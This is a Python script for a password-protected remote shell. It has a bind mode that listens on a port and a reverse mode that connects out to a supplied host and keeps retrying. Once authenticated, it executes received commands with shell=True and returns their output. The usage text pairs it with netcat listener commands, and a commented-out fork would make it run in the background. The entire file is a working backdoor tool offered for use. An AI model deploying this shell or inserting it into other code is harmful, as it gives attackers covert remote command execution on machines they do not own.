# -*- coding: utf-8 -*- 
#!/usr/bin/env python
#python2 python3

import os 
import sys
import socket
import time
import subprocess


USAGE="""
usage:  
#bind mode                                  
 %s -b password port              
 nc host port                        

#receive mode                                       
 nc -l -p port                     
 %s -r password port host         
""" % (sys.argv[0],sys.argv[0])


MAX_LEN=1024
TIME_OUT=300 #s
PW=""
PORT=""
HOST="0.0.0.0"



def shell(cmd):
    p=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    stdout,stderr = p.stdout.read(),p.stderr.read()
    return stdout+stderr


def safe_encode(msg):
    try:
        return msg.encode("utf8")
    except:
        return msg


def safe_decode(msg):
    try:
        return msg.decode("utf8")
    except:
        return msg


def action(conn):
    conn.send(safe_encode("Password: "))
    try: 
        pw_in=safe_decode(conn.recv(len(PW)))
    except: 
        print("get password failed, will try again")
        return True
    else:    
        if pw_in != PW: 
            conn.send(safe_encode("bye, will not accept any command in this session\n"))
            return True
        else:
            conn.send(safe_encode("now you can type shell\n"))                       
            while True:      
                try:
                    conn.send(safe_encode("\n# "))
                    try:
                        pcmd=safe_decode(conn.recv(MAX_LEN))
                    except:
                        print("get message failed, will try again")
                        return True                    
                    else:
                        cmd=pcmd[:-1]
                        if cmd=="quit":
                            conn.send(safe_encode("quit, will not accept any command in this session\n"))
                            return True
                        elif cmd=="stop":
                            conn.send(safe_encode("remote stop, will not accept any command in this session\n"))
                            return False
                        else:
                            if len(cmd)>0:
                                out=shell(cmd)
                                conn.send(safe_encode(out))
                except:
                    return True
    

def get_sock_conn(host, port, bind=True):
    
    while True:
    
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
        sock.settimeout(TIME_OUT)
        
        if bind:
            try:
                sock.bind((HOST, PORT))
                sock.listen(0)
                (conn,addr)=sock.accept()
                return conn
            except:
                time.sleep(1)
                print("bind port failed")
        else:
            try:    
                sock.connect((host, port))
                print("connect remote host success")
                return sock
            except: 
                #from traceback import format_exc
                #print(format_exc())
                time.sleep(1)
                print("connect remote host failed, wait and retry")
                

if __name__ == "__main__":
    argv=sys.argv
    bind=True
    if len(argv)>1 and argv[1]=="-b" and len(argv)==4: 
        PW=argv[2]
        PORT=argv[3]
    elif len(argv)>1 and argv[1]=="-r" and len(argv)==5:
        PW=argv[2]
        PORT=argv[3]
        HOST=argv[4]
        bind=False
    else: 
        print(USAGE)
        exit(1)
    
    PORT=int(PORT)
    print("PW:",PW,"PORT:",PORT,"HOST:",HOST)
        
    ## run in background
    #if os.fork()!=0: 
    #    sys.exit(0)
    
    conn=get_sock_conn(HOST, PORT, bind)
    
    while True:
        try:
            run=action(conn)   
        except:
            pass
        if not run:
            break
        conn=get_sock_conn(HOST, PORT, bind)
        
    
    if conn:
        conn.shutdown(2)
